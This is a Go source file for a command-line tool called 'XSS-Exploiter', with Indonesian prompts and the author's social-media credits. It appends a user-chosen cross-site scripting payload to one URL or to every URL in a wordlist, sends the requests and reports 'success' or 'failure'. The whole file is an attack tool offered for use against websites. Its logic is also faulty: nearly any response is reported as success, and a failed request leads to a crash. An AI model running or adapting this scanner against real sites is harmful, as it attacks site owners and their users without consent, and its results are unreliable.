package main

import (
	"fmt"
	"bufio"
	"os"
	"net/http"
	"github.com/mgutz/ansi"
	"time"
)

func wordlist(){
	error1 := ansi.Color(" [+] Berhasil", "green+b:white")
	error2 := ansi.Color(" [-] Gagal", "red+b:white")
	a1 := ansi.Color("[", "green")
	a2 := ansi.Color("] ", "green")

	var waktu = time.Now()
	
	var exploit string

	fmt.Print("Masukan exploit : ")
	fmt.Scan(&exploit)
	wr, error := os.Open("web.txt")
	
	if error != nil{
		fmt.Print("[!] Wordlist Nya kgk ada")
	}

	sc := bufio.NewScanner(wr)
	for sc.Scan(){
		var asw = sc.Text()

		r, error := http.Get(asw + "'" + "<h1>" + exploit + "</h1>")

		if error != nil{
			fmt.Print("[!] Error 404")
		}

		if r.StatusCode >= 200{
			fmt.Print(a1, waktu.Year(), "-", waktu.Hour(), "-", waktu.Minute(), "-", waktu.Second(), a2, asw, "'", "<h1>", exploit, "</h1>", error1)
		}else if r.StatusCode >= 400 && r.StatusCode >= 404{
			fmt.Print(a1, waktu.Year(), "-", waktu.Hour(), "-", waktu.Minute(), "-", waktu.Second(), a2, asw, "'", "<h1>", exploit, "</h1>", error2)
		}
	}
}

func langsung(){
	error3 := ansi.Color(" [+] Berhasil", "green+b:white")
	error4 := ansi.Color(" [-] Gagal :( ", "red+b:white")
	b1 := ansi.Color("[", "green")
	b2 := ansi.Color("] ", "green")

	var w = time.Now()
	var url string
	var ex string
	fmt.Print("Masukan URL : ")
	fmt.Scan(&url)
	fmt.Print("Masukan Exploit : ")
	fmt.Scan(&ex)

	http, error := http.Get(url + "'" + "<h1>" + ex + "</h1>")

	if error != nil{
		fmt.Print("[!] Error 404")
	}

	if http.StatusCode >= 200{
		fmt.Print(b1, w.Hour(), "-", w.Minute(), "-", w.Second(), b2, url, "'", "<h1>", ex, "</h1>", error3)
	}else if http.StatusCode >= 400 && http.StatusCode >= 404{
		fmt.Print(b1, w.Hour(), "-", w.Minute(), "-", w.Second(), b2, url, "'", "<h1>", ex, "</h1>", error4)
	}
}

func main(){
	var wkt = time.Now();
	title := ansi.Color("XSS-Exploiter By Fajar Firdaus", "green+b:white")
	b1 := ansi.Color("[======================]\n", "blue")
	b2 := ansi.Color("Coder : Fajar FIrdaus\n", "green")
	b3 := ansi.Color("FB : Fajar Firdaus\n", "green")
	b4 := ansi.Color("YT : iTech7732\n", "green")
	b5 := ansi.Color("IG : fajar_firdaus_7\n", "green")
	b6 := ansi.Color("[======================]\n\n", "blue")

	menu1 := ansi.Color("(1).> Exploit Menggunakan Wordlist\n", "green+b:yellow")
	menu2 := ansi.Color("(2).> Exploit Langsung\n", "green+b:yellow")

	input1 := ansi.Color("[ Input ] > ", "blue+b:white")

	blok1 := ansi.Color("[", "green")
	blok2 := ansi.Color("] ", "green")
	fmt.Print(title)
	fmt.Print(b1)
	fmt.Print(b2)
	fmt.Print(b3)
	fmt.Print(b4)
	fmt.Print(b5)
	fmt.Print(b6)

	fmt.Print(b1)
	fmt.Print(menu1)
	fmt.Print(menu2)
	fmt.Print(b1)

	fmt.Print(blok1, wkt.Hour(), wkt.Minute(), wkt.Second(), blok2, input1)
	var cs int = 1
	var d2 int = 2
	fmt.Print("input : ")
	fmt.Scan(&cs)

	if (cs<d2){
		langsung()
	}else{
		wordlist()
	}
}